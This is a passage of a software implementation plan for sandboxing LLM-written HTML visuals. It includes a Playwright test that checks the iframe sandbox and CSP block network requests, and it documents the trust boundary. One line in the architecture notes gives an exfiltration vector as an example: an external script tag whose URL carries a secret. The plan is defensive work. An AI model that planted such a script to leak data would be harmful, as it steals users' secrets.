  const offOrigin: string[] = [];
  page.on("request", (r) => {
    if (!r.url().startsWith(origin) && !r.url().startsWith("data:")) offOrigin.push(r.url());
  });

  await page.goto(visualUrl);

  const frame = page.frameLocator('iframe[sandbox="allow-scripts"]');
  const canvas = frame.locator("#chart canvas").first();
  await expect(canvas).toBeVisible();                       // ECharts really drew
  expect((await canvas.boundingBox())!.width).toBeGreaterThan(100);

  const body = frame.locator("body");
  await expect(body).toHaveAttribute("data-fetch", "blocked");      // connect-src 'none'
  await expect(body).toHaveAttribute("data-extscript", "blocked");  // no external origin
  await expect(body).toHaveAttribute("data-cookie", "blocked");     // opaque origin

  expect(page.url()).toBe(visualUrl);                        // no top-frame navigation
  expect(offOrigin).toEqual([]);                             // not one byte left the origin
});

test("an anonymous visitor is sent to login, not to the artifact", async ({ page }) => {
  await page.goto(visualUrl);
  expect(page.url()).toContain("/login");
});
```

- [ ] **Step 4: Run it and watch it fail for the right reason**

Run: `npm run test:e2e`
Expected: FAIL at first only if something is genuinely wrong. If it fails, read the failure
before changing anything:
- `data-cookie` is `empty` rather than `blocked` → the sandbox is granting `allow-same-origin`.
  **Stop and fix the sandbox**; this is the invariant.
- The chart never renders and `offOrigin` is empty → the vendored `<script src>` was blocked
  by CSP: `baseUrl` does not match the browser's origin, or `'self'` is being relied on. Check
  `artifactCsp`.
- Mermaid/ECharts global is undefined → the bundle is an ES module, not UMD. Revisit Task 3.

- [ ] **Step 5: Wire it into the Makefile and CI**

Add to `Makefile`, following the existing target style:

```make
test-e2e: ## browser tests: the sandbox + CSP boundary (needs chromium)
	npx playwright install --with-deps chromium
	npm run test:e2e
```

In `.github/workflows/ci.yml`, after the existing test step:

```yaml
      - name: Install Chromium
        run: npx playwright install --with-deps chromium
      - name: Browser boundary tests
        run: npm run test:e2e
```

- [ ] **Step 6: Run the whole gate**

Run: `npm run check && npm run test:e2e`
Expected: PASS, both.

- [ ] **Step 7: Commit**

```bash
git add playwright.config.ts e2e package.json package-lock.json Makefile .github/workflows/ci.yml
git commit -m "test(e2e): observe the sandbox and CSP actually blocking exfiltration"
```

---

### Task 7: Documentation

**Files:**
- Modify: `README.md` (the artifact-host bullet and the Status line)
- Modify: `ARCHITECTURE.md` (the artifact section)
- Modify: `docs/jean-integration.md` (what Jean gets, and the shared-token caveat)

- [ ] **Step 1: Update `README.md`**

Replace the artifact-host bullet:

```markdown
- **Visual host** — publish rich HTML (reports, dashboards, charts, diagrams) and get back
  a login-gated URL at `/visual/<id>`. **JavaScript runs**: ECharts and Mermaid are vendored
  same-origin under `/vendor/`. The page is framed with `sandbox="allow-scripts"` on an
  opaque origin and a CSP with `connect-src 'none'` and no external origin, so agent-authored
  script can draw a chart but cannot reach the network, read a session cookie, or escape its
  frame. Bytes live on disk locally, in Azure Blob Storage in production.
```

And the Status line, replacing the test count with the real one from `npm test`:

```markdown
Feature-complete. The default suite (<N> tests) runs entirely on in-memory adapters — no
database, no cloud, no credentials. `make test-e2e` additionally drives a real browser to
verify the visual sandbox holds; it is the only test that needs one.
```

- [ ] **Step 2: Update `ARCHITECTURE.md`**

Replace bullet 2 near the top (currently "**HTML artifact host** — clients publish rich HTML
and get back a login-gated URL to share (e.g. Jean posting a report into a Slack thread).")
with:

```markdown
2. **Visual host** — clients publish rich HTML and get back a login-gated URL to share
   (e.g. Jean posting a chart into a Slack thread). The page may run JavaScript, so it is
   served untrusted; see "The visual sandbox" below.
```

Then add this section after "Two auth planes":

```markdown
## The visual sandbox

A published visual is HTML an LLM wrote. It runs JavaScript — that is the point, it is how
a chart draws — so it is treated as hostile code and given two documents instead of one:

| Route | Content | Trust |
|---|---|---|
| `/visual/:id` | Portico's own shell: a title bar and an `<iframe>`. No script of its own. | Trusted |
| `/visual/:id/raw` | The stored artifact bytes. | **Untrusted** |

The shell frames the artifact with `sandbox="allow-scripts"` and **not**
`allow-same-origin`. That combination hands the artifact an *opaque* origin: its script
cannot read the portico session cookie or `localStorage`, cannot see the shell document,
and — with no `allow-top-navigation` — cannot redirect the tab. Granting `allow-scripts`
and `allow-same-origin` together would let the framed page reach into its own DOM and
delete that very attribute, so **they must never both appear**. This is the load-bearing
invariant of the visual host; `visual-shell.test.ts` asserts it, and the Playwright suite
observes a real browser enforce it.

The artifact's CSP then removes every way out: `connect-src 'none'` (no fetch, XHR,
WebSocket, or beacon) and no external origin anywhere in the policy. That second half
matters more than it looks — an external `<script src="//host/?d=SECRET">` is an outbound
GET carrying stolen data, so *any* permitted external origin is an exfiltration channel no
matter how tight `connect-src` is. That is why CDNs are banned outright rather than
allowlisted, and why ECharts and Mermaid are vendored same-origin under `/vendor/` at
version-pinned, immutable paths: a visual hard-codes the path it was written against, so
those bytes are never replaced, only added to. Script runs; nothing leaves.

Both routes are session-gated and both run the full visibility check. `/raw` is a URL a
person can paste into a browser, so it defends itself rather than trusting the shell to
have done it.
```

- [ ] **Step 3: Update `docs/jean-integration.md`**

Add, after the "The model" section:

```markdown
## Visuals

Jean gets `portico__publish_html` for free through the portico plugin — no Jean code
change. Ask Jean for a chart and it writes an HTML page against the vendored libraries,
publishes it, and posts the `/visual/<id>` link into the thread.

**One caveat worth knowing.** Jean authenticates with a single shared
`PORTICO_ACCESS_TOKEN`, not a token per Slack user, so every visual Jean publishes is owned
by one portico identity. `visibility: "private"` is therefore meaningless for Jean's
visuals — it would mean "private to the bot" — and `portico__list_artifacts` shows the whole
team's. Jean should publish with the default `visibility: "authenticated"`: any signed-in
Portico user can view, which is what a Slack team wants anyway. Per-Slack-user tokens are
separate, future work.
```

- [ ] **Step 4: Commit**

```bash
git add README.md ARCHITECTURE.md docs/jean-integration.md
git commit -m "docs: the visual host, its sandbox, and Jean's shared-token caveat"
```

---

## Follow-up (separate repo, not this plan)

The **oka-skills** `portico` plugin needs a visualization skill: triggers on
chart/graph/dashboard/diagram/visualize; carries a known-good page template with the exact
`/vendor/` script tags, a worked ECharts example with real data, a Mermaid example, and the
explicit *these fail silently* list (no CDN, no `fetch`, no remote images or fonts). Write
it against the deployed CSP once this branch is live, so the template is validated against
the real thing rather than against this document.
